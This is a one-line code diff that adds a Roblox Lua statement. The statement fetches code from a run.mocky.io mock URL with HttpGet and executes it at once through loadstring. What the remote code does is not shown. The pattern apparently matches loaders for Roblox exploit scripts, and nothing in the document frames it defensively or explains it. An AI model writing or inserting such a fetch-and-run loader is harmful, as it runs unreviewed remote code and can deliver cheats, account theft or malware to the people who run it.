@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://run.mocky.io/v3/daa5cfc3-5361-4fbf-bd40-bad841adf396"))()
